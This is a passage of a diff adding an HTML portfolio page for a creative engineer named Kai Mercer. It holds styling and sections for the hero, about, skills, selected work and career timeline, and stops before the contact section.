@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Kai Mercer — Creative Engineer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@500;600;700;800&family=Manrope:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clientjs/0.1.11/client.min.js"></script>
+<style>
+  /* ============ RESET & TOKENS ============ */
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  :root{
+    --bg:#0b0b10;
+    --bg-2:#11111a;
+    --surface:#16161f;
+    --surface-2:#1c1c28;
+    --border:rgba(255,255,255,.08);
+    --border-strong:rgba(255,255,255,.14);
+    --text:#f4f4f7;
+    --muted:#8b8b9a;
+    --dim:#5b5b6b;
+    --accent:#ff5e3a;
+    --accent-2:#ffb547;
+    --teal:#00e5d4;
+    --violet:#b794f6;
+    --grad:linear-gradient(135deg,#ff5e3a 0%,#ffb547 50%,#ff3d7f 100%);
+    --grad-cool:linear-gradient(135deg,#00e5d4 0%,#b794f6 100%);
+    --radius:20px;
+    --shadow:0 30px 80px -20px rgba(0,0,0,.6);
+  }
+  html{scroll-behavior:smooth}
+  body{
+    font-family:'Manrope',system-ui,sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    line-height:1.6;
+    overflow-x:hidden;
+    -webkit-font-smoothing:antialiased;
+  }
+  ::selection{background:var(--accent);color:#fff}
+  a{color:inherit;text-decoration:none}
+  img{max-width:100%;display:block}
+  .container{width:min(1180px,92%);margin-inline:auto}
+
+  /* ============ AMBIENT BACKGROUND ============ */
+  .ambient{position:fixed;inset:0;z-index:-2;overflow:hidden;pointer-events:none}
+  .blob{position:absolute;border-radius:50%;filter:blur(120px);opacity:.45;mix-blend-mode:screen}
+  .blob.b1{width:560px;height:560px;background:#ff5e3a;top:-160px;left:-120px;animation:float1 18s ease-in-out infinite}
+  .blob.b2{width:520px;height:520px;background:#00e5d4;top:30%;right:-180px;animation:float2 22s ease-in-out infinite}
+  .blob.b3{width:480px;height:480px;background:#b794f6;bottom:-180px;left:30%;animation:float3 26s ease-in-out infinite}
+  @keyframes float1{50%{transform:translate(120px,80px) scale(1.1)}}
+  @keyframes float2{50%{transform:translate(-100px,60px) scale(.9)}}
+  @keyframes float3{50%{transform:translate(80px,-100px) scale(1.15)}}
+  .grain{position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.04;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  }
+  .grid-overlay{position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.4;
+    background-image:linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);
+    background-size:60px 60px;mask-image:radial-gradient(ellipse at 50% 30%,#000 30%,transparent 80%);
+  }
+
+  /* ============ CUSTOM CURSOR ============ */
+  .cursor-dot,.cursor-ring{position:fixed;top:0;left:0;pointer-events:none;z-index:9999;border-radius:50%;transform:translate(-50%,-50%);mix-blend-mode:difference}
+  .cursor-dot{width:6px;height:6px;background:#fff;transition:transform .1s}
+  .cursor-ring{width:36px;height:36px;border:1px solid rgba(255,255,255,.5);transition:transform .25s cubic-bezier(.2,.9,.3,1.4),width .25s,height .25s,background .25s}
+  .cursor-ring.hover{width:64px;height:64px;background:rgba(255,255,255,.08)}
+  @media (max-width:768px){.cursor-dot,.cursor-ring{display:none}}
+
+  /* ============ NAV ============ */
+  header.nav{position:fixed;top:0;left:0;right:0;z-index:100;padding:22px 0;transition:.4s}
+  header.nav.scrolled{padding:14px 0;background:rgba(11,11,16,.7);backdrop-filter:blur(20px);border-bottom:1px solid var(--border)}
+  .nav-inner{display:flex;align-items:center;justify-content:space-between;gap:30px}
+  .brand{display:flex;align-items:center;gap:10px;font-family:'Syne';font-weight:700;font-size:20px;letter-spacing:-.02em}
+  .brand-mark{width:34px;height:34px;border-radius:10px;background:var(--grad);display:grid;place-items:center;font-size:14px;color:#0b0b10;font-weight:800;box-shadow:0 6px 20px -4px rgba(255,94,58,.6)}
+  nav.links{display:flex;gap:6px;align-items:center;background:rgba(255,255,255,.04);border:1px solid var(--border);padding:6px;border-radius:100px;backdrop-filter:blur(20px)}
+  nav.links a{padding:8px 16px;border-radius:100px;font-size:13.5px;font-weight:500;color:var(--muted);transition:.25s;position:relative}
+  nav.links a:hover{color:var(--text);background:rgba(255,255,255,.06)}
+  nav.links a.active{color:#0b0b10;background:var(--text)}
+  .nav-cta{display:inline-flex;align-items:center;gap:8px;padding:11px 20px;border-radius:100px;background:var(--text);color:#0b0b10;font-weight:600;font-size:13.5px;transition:.3s}
+  .nav-cta:hover{transform:translateY(-2px);box-shadow:0 12px 30px -8px rgba(255,255,255,.3)}
+  .menu-btn{display:none;background:none;border:none;color:var(--text);font-size:22px;cursor:pointer}
+  @media (max-width:860px){
+    nav.links{display:none}
+    .menu-btn{display:block}
+    .nav-cta{display:none}
+  }
+
+  /* ============ HERO ============ */
+  .hero{position:relative;min-height:100vh;display:flex;align-items:center;padding:140px 0 80px}
+  .hero-grid{display:grid;grid-template-columns:1.2fr .8fr;gap:60px;align-items:center}
+  @media (max-width:900px){.hero-grid{grid-template-columns:1fr;gap:50px}}
+  .status-chip{display:inline-flex;align-items:center;gap:10px;padding:8px 16px;border:1px solid var(--border);border-radius:100px;background:rgba(255,255,255,.03);font-size:13px;color:var(--muted);margin-bottom:30px;backdrop-filter:blur(10px)}
+  .status-dot{width:8px;height:8px;border-radius:50%;background:var(--teal);box-shadow:0 0 0 4px rgba(0,229,212,.2);animation:pulse 2s infinite}
+  @keyframes pulse{50%{box-shadow:0 0 0 8px rgba(0,229,212,0)}}
+  h1.hero-title{font-family:'Syne';font-weight:800;font-size:clamp(48px,7.5vw,104px);line-height:.95;letter-spacing:-.04em;margin-bottom:24px}
+  .hero-title .line{display:block;overflow:hidden}
+  .hero-title .line span{display:inline-block;transform:translateY(110%);animation:rise .9s cubic-bezier(.2,.8,.2,1) forwards}
+  .hero-title .line:nth-child(2) span{animation-delay:.15s}
+  .hero-title .line:nth-child(3) span{animation-delay:.3s}
+  @keyframes rise{to{transform:translateY(0)}}
+  .hero-title em{font-style:normal;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:600}
+  .hero-title .italic{font-style:italic;font-weight:500;color:var(--muted)}
+  .hero-sub{font-size:18px;color:var(--muted);max-width:540px;margin-bottom:38px;line-height:1.7}
+  .hero-actions{display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+  .btn{display:inline-flex;align-items:center;gap:10px;padding:16px 28px;border-radius:100px;font-weight:600;font-size:14.5px;transition:.3s;cursor:pointer;border:1px solid transparent}
+  .btn-primary{background:var(--grad);color:#0b0b10;box-shadow:0 14px 40px -10px rgba(255,94,58,.5)}
+  .btn-primary:hover{transform:translateY(-3px);box-shadow:0 20px 50px -10px rgba(255,94,58,.65)}
+  .btn-ghost{background:rgba(255,255,255,.04);border:1px solid var(--border-strong);color:var(--text);backdrop-filter:blur(10px)}
+  .btn-ghost:hover{background:rgba(255,255,255,.08);transform:translateY(-3px)}
+  .hero-meta{display:flex;gap:36px;margin-top:54px;flex-wrap:wrap}
+  .meta-item .num{font-family:'Syne';font-size:30px;font-weight:700;background:var(--grad-cool);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .meta-item .lbl{font-size:12.5px;color:var(--dim);text-transform:uppercase;letter-spacing:.12em;margin-top:4px}
+
+  /* ============ PROFILE CARD ============ */
+  .profile-wrap{position:relative;display:flex;justify-content:center}
+  .profile-card{position:relative;width:340px;aspect-ratio:4/5;border-radius:28px;overflow:hidden;background:linear-gradient(160deg,rgba(255,94,58,.15),rgba(0,229,212,.08));border:1px solid var(--border-strong);box-shadow:var(--shadow);transform:rotate(-3deg);transition:.5s cubic-bezier(.2,.8,.2,1)}
+  .profile-card:hover{transform:rotate(0deg) scale(1.02)}
+  .profile-img{position:absolute;inset:0;background:url('https://picsum.photos/seed/kaiprofile/700/900') center/cover;filter:grayscale(.2) contrast(1.05)}
+  .profile-card::after{content:'';position:absolute;inset:0;background:linear-gradient(to top,rgba(11,11,16,.9) 0%,transparent 50%)}
+  .profile-badge{position:absolute;bottom:22px;left:22px;right:22px;z-index:2}
+  .profile-badge .name{font-family:'Syne';font-weight:700;font-size:22px;letter-spacing:-.02em}
+  .profile-badge .role{font-size:13px;color:var(--muted);margin-top:2px}
+  .floating-tag{position:absolute;padding:8px 14px;border-radius:100px;background:rgba(11,11,16,.7);border:1px solid var(--border-strong);backdrop-filter:blur(20px);font-size:12px;font-weight:600;display:flex;align-items:center;gap:8px;box-shadow:0 12px 30px -8px rgba(0,0,0,.5)}
+  .ft-1{top:24px;right:-30px;color:var(--accent-2);animation:bob 4s ease-in-out infinite}
+  .ft-2{bottom:38%;left:-50px;color:var(--teal);animation:bob 5s ease-in-out infinite .5s}
+  .ft-3{top:46%;right:-40px;color:var(--violet);animation:bob 4.5s ease-in-out infinite 1s}
+  @keyframes bob{50%{transform:translateY(-12px)}}
+  @media (max-width:900px){.ft-1{right:-10px}.ft-2{left:-10px}.ft-3{right:-10px}}
+
+  /* ============ MARQUEE ============ */
+  .marquee{padding:50px 0;border-top:1px solid var(--border);border-bottom:1px solid var(--border);overflow:hidden;mask-image:linear-gradient(90deg,transparent,#000 10%,#000 90%,transparent)}
+  .marquee-track{display:flex;gap:60px;width:max-content;animation:scroll 30s linear infinite}
+  .marquee-track span{font-family:'Syne';font-size:42px;font-weight:600;color:var(--dim);letter-spacing:-.02em;white-space:nowrap;transition:.3s}
+  .marquee-track span:hover{color:var(--accent)}
+  .marquee-track .dot{color:var(--accent)}
+  @keyframes scroll{to{transform:translateX(-50%)}}
+
+  /* ============ SECTION TITLES ============ */
+  section{padding:120px 0;position:relative}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:30px;margin-bottom:60px;flex-wrap:wrap}
+  .sec-tag{display:inline-flex;align-items:center;gap:8px;font-size:12.5px;color:var(--accent);text-transform:uppercase;letter-spacing:.18em;font-weight:600;margin-bottom:14px}
+  .sec-tag::before{content:'';width:24px;height:1px;background:var(--accent)}
+  h2.sec-title{font-family:'Syne';font-weight:700;font-size:clamp(34px,5vw,56px);letter-spacing:-.03em;line-height:1.05}
+  h2.sec-title em{font-style:italic;font-weight:500;color:var(--muted)}
+  .sec-desc{max-width:380px;color:var(--muted);font-size:15px;line-height:1.7}
+
+  /* ============ ABOUT ============ */
+  .about-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px}
+  @media (max-width:860px){.about-grid{grid-template-columns:1fr}}
+  .glass{background:rgba(255,255,255,.025);border:1px solid var(--border);border-radius:var(--radius);padding:38px;backdrop-filter:blur(20px);transition:.4s;position:relative;overflow:hidden}
+  .glass:hover{border-color:var(--border-strong);background:rgba(255,255,255,.04);transform:translateY(-4px)}
+  .glass::before{content:'';position:absolute;top:0;left:0;width:100%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);transform:translateX(-100%);transition:.6s}
+  .glass:hover::before{transform:translateX(100%)}
+  .about-text p{color:var(--muted);font-size:16px;line-height:1.8;margin-bottom:16px}
+  .about-text p strong{color:var(--text);font-weight:600}
+  .about-text .quote{font-family:'Syne';font-size:22px;font-weight:500;color:var(--text);line-height:1.4;margin:24px 0;padding-left:20px;border-left:3px solid var(--accent);font-style:italic}
+  .info-list{display:flex;flex-direction:column;gap:18px}
+  .info-row{display:flex;justify-content:space-between;align-items:center;padding-bottom:18px;border-bottom:1px dashed var(--border)}
+  .info-row:last-child{border-bottom:0}
+  .info-row .k{color:var(--dim);font-size:13px;text-transform:uppercase;letter-spacing:.1em}
+  .info-row .v{font-weight:600;color:var(--text);font-size:15px}
+  .info-row .v.accent{color:var(--accent-2)}
+
+  /* ============ SKILLS ============ */
+  .skills-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+  @media (max-width:760px){.skills-grid{grid-template-columns:1fr}}
+  .skill{padding:24px;border:1px solid var(--border);border-radius:16px;background:rgba(255,255,255,.02);transition:.3s;display:flex;flex-direction:column;gap:14px}
+  .skill:hover{border-color:var(--accent);background:rgba(255,94,58,.05);transform:translateY(-3px)}
+  .skill-top{display:flex;justify-content:space-between;align-items:center}
+  .skill-name{font-weight:600;font-size:15px;display:flex;align-items:center;gap:10px}
+  .skill-name i{width:32px;height:32px;border-radius:8px;display:grid;place-items:center;background:rgba(255,255,255,.05);font-size:14px}
+  .skill-pct{font-family:'Syne';font-size:14px;font-weight:600;color:var(--accent-2)}
+  .bar{height:6px;border-radius:100px;background:rgba(255,255,255,.06);overflow:hidden}
+  .bar-fill{height:100%;border-radius:100px;background:var(--grad);width:0;transition:width 1.4s cubic-bezier(.2,.8,.2,1)}
+
+  /* ============ WORK ============ */
+  .work-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:20px}
+  @media (max-width:900px){.work-grid{grid-template-columns:repeat(2,1fr)}}
+  .work-card{position:relative;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border);background:var(--surface);cursor:pointer;transition:.4s}
+  .work-card.large{grid-column:span 4}
+  .work-card.small{grid-column:span 2}
+  .work-card.tall{grid-column:span 2;grid-row:span 2}
+  @media (max-width:900px){.work-card.large,.work-card.small,.work-card.tall{grid-column:span 2;grid-row:auto}}
+  .work-card:hover{transform:translateY(-6px);border-color:var(--accent)}
+  .work-img{aspect-ratio:16/10;background-size:cover;background-position:center;transition:.6s}
+  .work-card.tall .work-img{aspect-ratio:1/1.4}
+  .work-card:hover .work-img{transform:scale(1.06)}
+  .work-body{padding:22px}
+  .work-cat{font-size:11.5px;color:var(--accent);text-transform:uppercase;letter-spacing:.14em;font-weight:600;margin-bottom:8px}
+  .work-title{font-family:'Syne';font-weight:600;font-size:20px;letter-spacing:-.02em}
+  .work-desc{color:var(--muted);font-size:13.5px;margin-top:6px}
+  .work-arrow{position:absolute;top:20px;right:20px;width:40px;height:40px;border-radius:50%;background:rgba(11,11,16,.6);backdrop-filter:blur(10px);display:grid;place-items:center;border:1px solid var(--border-strong);opacity:0;transform:translate(-10px,10px);transition:.4s}
+  .work-card:hover .work-arrow{opacity:1;transform:translate(0,0);background:var(--accent);color:#0b0b10}
+
+  /* ============ EXPERIENCE TIMELINE ============ */
+  .timeline{position:relative;padding-left:30px}
+  .timeline::before{content:'';position:absolute;left:7px;top:8px;bottom:8px;width:1px;background:linear-gradient(180deg,var(--accent),transparent)}
+  .tl-item{position:relative;padding-bottom:42px;padding-left:28px}
+  .tl-item:last-child{padding-bottom:0}
+  .tl-item::before{content:'';position:absolute;left:-30px;top:6px;width:16px;height:16px;border-radius:50%;background:var(--bg);border:2px solid var(--accent);box-shadow:0 0 0 4px rgba(255,94,58,.15)}
+  .tl-year{font-family:'Syne';font-size:13px;color:var(--accent-2);font-weight:600;letter-spacing:.06em}
+  .tl-role{font-family:'Syne';font-size:21px;font-weight:600;margin:4px 0 2px;letter-spacing:-.02em}
+  .tl-co{color:var(--muted);font-size:14px;margin-bottom:10px}
+  .tl-co span{color:var(--teal)}
+  .tl-desc{color:var(--muted);font-size:14.5px;line-height:1.7}
+
+  /* ============ STATS ============ */
+  .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;padding:50px;border-radius:28px;background:linear-gradient(135deg,rgba(255,94,58,.08),rgba(0,229,212,.05));border:1px solid var(--border-strong);position:relative;overflow:hidden}
+  @media (max-width:760px){.stats-row{grid-template-columns:repeat(2,1fr);padding:30px}}
+  .stat{text-align:center}
+  .stat .n{font-family:'Syne';font-size:clamp(36px,5vw,56px);font-weight:700;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;line-height:1}
+  .stat .l{color:var(--muted);font-size:13px;margin-top:8px;text-transform:uppercase;letter-spacing:.1em}
+
+  /* ============ CONTACT ============ */
+  .contact{position:relative;padding:140px 0;text-align:center}
+  .contact-card{padding:80px 40px;border-radius:32px;background:linear-gradient(135deg,rgba(255,94,58,.1),rgba(183,148,246,.08));border:1px solid var(--border-strong);position:relative;overflow:hidden}
+  .contact-card::before{content:'';position:absolute;width:400px;height:400px;background:var(--accent);filter:blur(120px);opacity:.3;border-radius:50%;top:-100px;left:50%;transform:translateX(-50%)}
+  .contact h2{font-family:'Syne';font-weight:700;font-size:clamp(40px,6vw,80px);letter-spacing:-.04em;line-height:1;position:relative;margin-bottom:24px}
+  .contact h2 em{font-style:normal;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .contact p{color:var(--muted);max-width:520px;margin:0 auto 40px;font-size:17px;position:relative}
+  .contact .btn{position:relative}
+  .socials{display:flex;gap:14px;justify-content:center;margin-top:50px;position:relative}
+  .social{width:48px;height:48px;border-radius:50%;border:1px solid var(--border-strong);display:grid;place-items:center;color:var(--muted);transition:.3s;background:rgba(255,255,255,.02)}
+  .social:hover{transform:translateY(-4px);background:var(--accent);color:#0b0b10;border-color:var(--accent)}
+
+  /* ============ FOOTER ============ */
+  footer{padding:40px 0;border-top:1px solid var(--border);color:var(--dim);font-size:13px}
+  .foot-inner{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:14px}
+  footer a:hover{color:var(--accent)}
+
+  /* ============ REVEAL ============ */
+  .reveal{opacity:0;transform:translateY(40px);transition:opacity .8s cubic-bezier(.2,.8,.2,1),transform .8s cubic-bezier(.2,.8,.2,1)}
+  .reveal.in{opacity:1;transform:none}
+  .reveal.d1{transition-delay:.1s}.reveal.d2{transition-delay:.2s}.reveal.d3{transition-delay:.3s}.reveal.d4{transition-delay:.4s}
+
+  @media (prefers-reduced-motion:reduce){
+    *{animation:none!important;transition:none!important}
+    .reveal{opacity:1;transform:none}
+  }
+</style>
+</head>
+<body>
+
+<!-- Ambient -->
+<div class="ambient">
+  <div class="blob b1"></div>
+  <div class="blob b2"></div>
+  <div class="blob b3"></div>
+</div>
+<div class="grid-overlay"></div>
+<div class="grain"></div>
+
+<!-- Cursor -->
+<div class="cursor-dot" id="cDot"></div>
+<div class="cursor-ring" id="cRing"></div>
+
+<!-- NAV -->
+<header class="nav" id="nav">
+  <div class="container nav-inner">
+    <a href="#" class="brand" data-hover>
+      <span class="brand-mark">K</span>
+      Kai<span style="color:var(--accent)">.</span>
+    </a>
+    <nav class="links">
+      <a href="#about" class="active" data-hover>About</a>
+      <a href="#work" data-hover>Work</a>
+      <a href="#skills" data-hover>Skills</a>
+      <a href="#experience" data-hover>Journey</a>
+      <a href="#contact" data-hover>Contact</a>
+    </nav>
+    <a href="#contact" class="nav-cta" data-hover>
+      Let's talk <i class="fa-solid fa-arrow-right"></i>
+    </a>
+    <button class="menu-btn"><i class="fa-solid fa-bars"></i></button>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="container hero-grid">
+    <div>
+      <div class="status-chip"><span class="status-dot"></span> Available for select projects — Q3 2025</div>
+      <h1 class="hero-title">
+        <span class="line"><span>Crafting</span></span>
+        <span class="line"><span><em>interfaces</em> that</span></span>
+        <span class="line"><span class="italic">feel alive.</span></span>
+      </h1>
+      <p class="hero-sub">
+        I'm Kai Mercer — a creative engineer & motion designer building expressive products at the intersection of code, art, and emotion. Currently shaping the visual language of early-stage startups.
+      </p>
+      <div class="hero-actions">
+        <a href="#work" class="btn btn-primary" data-hover>
+          View selected work <i class="fa-solid fa-arrow-right"></i>
+        </a>
+        <a href="#contact" class="btn btn-ghost" data-hover>
+          <i class="fa-regular fa-envelope"></i> Get in touch
+        </a>
+      </div>
+      <div class="hero-meta">
+        <div class="meta-item"><div class="num">8+</div><div class="lbl">Years building</div></div>
+        <div class="meta-item"><div class="num">60+</div><div class="lbl">Projects shipped</div></div>
+        <div class="meta-item"><div class="num">12</div><div class="lbl">Awwwards mentions</div></div>
+      </div>
+    </div>
+
+    <div class="profile-wrap">
+      <div class="profile-card" data-hover>
+        <div class="profile-img"></div>
+        <div class="profile-badge">
+          <div class="name">Kai Mercer</div>
+          <div class="role">Creative Engineer · Lisbon, PT</div>
+        </div>
+        <div class="floating-tag ft-1"><i class="fa-solid fa-bolt"></i> Figma</div>
+        <div class="floating-tag ft-2"><i class="fa-solid fa-code"></i> WebGL</div>
+        <div class="floating-tag ft-3"><i class="fa-solid fa-wand-magic-sparkles"></i> Motion</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- MARQUEE -->
+<div class="marquee">
+  <div class="marquee-track">
+    <span>Design Systems</span><span class="dot">✦</span>
+    <span>WebGL Shaders</span><span class="dot">✦</span>
+    <span>Brand Identity</span><span class="dot">✦</span>
+    <span>Product Design</span><span class="dot">✦</span>
+    <span>Motion Graphics</span><span class="dot">✦</span>
+    <span>Prototyping</span><span class="dot">✦</span>
+    <span>Design Systems</span><span class="dot">✦</span>
+    <span>WebGL Shaders</span><span class="dot">✦</span>
+    <span>Brand Identity</span><span class="dot">✦</span>
+    <span>Product Design</span><span class="dot">✦</span>
+    <span>Motion Graphics</span><span class="dot">✦</span>
+    <span>Prototyping</span><span class="dot">✦</span>
+  </div>
+</div>
+
+<!-- ABOUT -->
+<section id="about">
+  <div class="container">
+    <div class="sec-head">
+      <div class="reveal">
+        <div class="sec-tag">01 — About</div>
+        <h2 class="sec-title">Part engineer,<br><em>part storyteller.</em></h2>
+      </div>
+      <p class="sec-desc reveal d2">A short note on how I think, what I obsess over, and why details matter more than features.</p>
+    </div>
+
+    <div class="about-grid">
+      <div class="glass about-text reveal">
+        <p>I spend my days translating <strong>abstract ideas into tactile, kinetic interfaces</strong> — the kind that feel less like software and more like a moment you remember.</p>
+        <p>My background is half visual design, half front-end engineering. That blend means I sketch in Figma in the morning and tune GLSL fragment shaders by the afternoon — and I think that's where the most interesting work lives.</p>
+        <div class="quote">"Good design whispers. Great design makes you forget the screen is there."</div>
+        <p>When I'm not in the editor, you'll find me running long distances badly, restoring vintage typewriters, or chasing perfect espresso in cafés I haven't been to yet.</p>
+      </div>
+
+      <div class="glass reveal d2">
+        <div class="info-list">
+          <div class="info-row"><span class="k">Based in</span><span class="v">Lisbon, Portugal 🇵🇹</span></div>
+          <div class="info-row"><span class="k">Experience</span><span class="v">8+ years</span></div>
+          <div class="info-row"><span class="k">Focus</span><span class="v accent">Creative Engineering</span></div>
+          <div class="info-row"><span class="k">Currently</span><span class="v">Design Lead @ Northwind</span></div>
+          <div class="info-row"><span class="k">Languages</span><span class="v">EN · PT · DE</span></div>
+          <div class="info-row"><span class="k">Availability</span><span class="v accent">Open · Q3 2025</span></div>
+          <div class="info-row"><span class="k">Email</span><span class="v">hello@kaimercer.studio</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SKILLS -->
+<section id="skills">
+  <div class="container">
+    <div class="sec-head">
+      <div class="reveal">
+        <div class="sec-tag">02 — Toolkit</div>
+        <h2 class="sec-title">Tools I lean on<br><em>every single day.</em></h2>
+      </div>
+      <p class="sec-desc reveal d2">Not a checklist of buzzwords — these are the things I'd reach for at 2am to ship something I'm proud of.</p>
+    </div>
+
+    <div class="skills-grid">
+      <div class="skill reveal" data-pct="95">
+        <div class="skill-top"><span class="skill-name"><i class="fa-brands fa-figma" style="color:#ff5e3a"></i> Figma & Design Systems</span><span class="skill-pct">95%</span></div>
+        <div class="bar"><div class="bar-fill"></div></div>
+      </div>
+      <div class="skill reveal d1" data-pct="92">
+        <div class="skill-top"><span class="skill-name"><i class="fa-brands fa-react" style="color:#00e5d4"></i> React & Next.js</span><span class="skill-pct">92%</span></div>
+        <div class="bar"><div class="bar-fill"></div></div>
+      </div>
+      <div class="skill reveal d2" data-pct="88">
+        <div class="skill-top"><span class="skill-name"><i class="fa-solid fa-cube" style="color:#b794f6"></i> Three.js / WebGL</span><span class="skill-pct">88%</span></div>
+        <div class="bar"><div class="bar-fill"></div></div>
+      </div>
+      <div class="skill reveal d3" data-pct="90">
+        <div class="skill-top"><span class="skill-name"><i class="fa-solid fa-wand-magic-sparkles" style="color:#ffb547"></i> Motion & GSAP</span><span class="skill-pct">90%</span></div>
+        <div class="bar"><div class="bar-fill"></div></div>
+      </div>
+      <div class="skill reveal d2" data-pct="85">
+        <div class="skill-top"><span class="skill-name"><i class="fa-solid fa-paintbrush" style="color:#ff3d7f"></i> Brand & Art Direction</span><span class="skill-pct">85%</span></div>
+        <div class="bar"><div class="bar-fill"></div></div>
+      </div>
+      <div class="skill reveal d3" data-pct="80">
+        <div class="skill-top"><span class="skill-name"><i class="fa-brands fa-swift" style="color:#ff5e3a"></i> Native & Prototyping</span><span class="skill-pct">80%</span></div>
+        <div class="bar"><div class="bar-fill"></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- WORK -->
+<section id="work">
+  <div class="container">
+    <div class="sec-head">
+      <div class="reveal">
+        <div class="sec-tag">03 — Selected Work</div>
+        <h2 class="sec-title">Things I've made<br><em>recently.</em></h2>
+      </div>
+      <p class="sec-desc reveal d2">A small set of projects from the last 18 months. Each one taught me something I now use every day.</p>
+    </div>
+
+    <div class="work-grid">
+      <article class="work-card large reveal" data-hover>
+        <div class="work-img" style="background-image:url('https://picsum.photos/seed/work1/900/600')"></div>
+        <div class="work-arrow"><i class="fa-solid fa-arrow-up-right"></i></div>
+        <div class="work-body">
+          <div class="work-cat">Product · 2025</div>
+          <div class="work-title">Halo — A finance dashboard that breathes</div>
+          <div class="work-desc">Redesigned the core experience for a YC fintech, reducing time-to-insight by 40%.</div>
+        </div>
+      </article>
+
+      <article class="work-card small reveal d1" data-hover>
+        <div class="work-img" style="background-image:url('https://picsum.photos/seed/work2/600/500')"></div>
+        <div class="work-arrow"><i class="fa-solid fa-arrow-up-right"></i></div>
+        <div class="work-body">
+          <div class="work-cat">Brand · 2024</div>
+          <div class="work-title">Vellum Type</div>
+          <div class="work-desc">Identity for an indie type foundry.</div>
+        </div>
+      </article>
+
+      <article class="work-card tall reveal d2" data-hover>
+        <div class="work-img" style="background-image:url('https://picsum.photos/seed/work3/600/800')"></div>
+        <div class="work-arrow"><i class="fa-solid fa-arrow-up-right"></i></div>
+        <div class="work-body">
+          <div class="work-cat">WebGL · 2024</div>
+          <div class="work-title">Aurora — Generative landing experience</div>
+          <div class="work-desc">An award-winning interactive scroll experience built with Three.js & custom shaders.</div>
+        </div>
+      </article>
+
+      <article class="work-card small reveal d3" data-hover>
+        <div class="work-img" style="background-image:url('https://picsum.photos/seed/work4/600/500')"></div>
+        <div class="work-arrow"><i class="fa-solid fa-arrow-up-right"></i></div>
+        <div class="work-body">
+          <div class="work-cat">Mobile · 2024</div>
+          <div class="work-title">Drift OS</div>
+          <div class="work-desc">A calm notes app for iOS.</div>
+        </div>
+      </article>
+
+      <article class="work-card small reveal d4" data-hover>
+        <div class="work-img" style="background-image:url('https://picsum.photos/seed/work5/600/500')"></div>
+        <div class="work-arrow"><i class="fa-solid fa-arrow-up-right"></i></div>
+        <div class="work-body">
+          <div class="work-cat">Motion · 2023</div>
+          <div class="work-title">Pulse Reel</div>
+          <div class="work-desc">Title sequence & brand motion.</div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- EXPERIENCE -->
+<section id="experience">
+  <div class="container">
+    <div class="sec-head">
+      <div class="reveal">
+        <div class="sec-tag">04 — Journey</div>
+        <h2 class="sec-title">Where I've<br><em>left a mark.</em></h2>
+      </div>
+      <p class="sec-desc reveal d2">A short timeline of teams, studios, and the people who shaped how I work today.</p>
+    </div>
+
+    <div class="timeline">
+      <div class="tl-item reveal">
+        <div class="tl-year">2023 — Present</div>
+        <div class="tl-role">Design Lead</div>
+        <div class="tl-co">Northwind Studio <span>· Lisbon</span></div>
+        <div class="tl-desc">Leading design for a 14-person studio working with early-stage founders. Built our in-house design system from zero, now powering 9 active client products.</div>
+      </div>
+      <div class="tl-item reveal d1">
+        <div class="tl-year">2020 — 2023</div>
+        <div class="tl-role">Senior Creative Engineer</div>
+        <div class="tl-co">Field & Co. <span>· Berlin</span></div>
+        <div class="tl-desc">Owned the interactive & motion practice. Shipped 20+ award-considered sites, mentored 4 juniors, and ran internal R&D on WebGL pipelines.</div>
+      </div>
+      <div class="tl-item reveal d2">
+        <div class="tl-year">2017 — 2020</div>
+        <div class="tl-role">Product Designer</div>
+        <div class="tl-co">Mossbank <span>· London</span></div>
+        <div class="tl-desc">Designed core flows for a B2B SaaS serving 80k+ daily users. First designer on the team — built the design language, hiring process, and research practice.</div>
+      </div>
+      <div class="tl-item reveal d3">
+        <div class="tl-year">2016 — 2017</div>
+        <div class="tl-role">Junior Designer</div>
+        <div class="tl-co">Indie freelance <span>· Remote</span></div>
+        <div class="tl-desc">Where it all began — small branding projects, late nights, and the slow realization that I loved the engineering side as much as the design.</div>
+      </div>
+    </div>
+
+    <div class="stats-row reveal" style="margin-top:80px">
+      <div class="stat"><div class="n" data-count="60">0</div><div class="l">Projects shipped</div></div>
+      <div class="stat"><div class="n" data-count="14">0</div><div class="l">Industry awards</div></div>
+      <div class="stat"><div class="n" data-count="9">0</div><div class="l">Countries worked from</div></div>
+      <div class="stat"><div class="n" data-count="42">0</div><div class="l">Coffee shops coded in</div></div>
+    </div>
+  </div>
+</section>
+
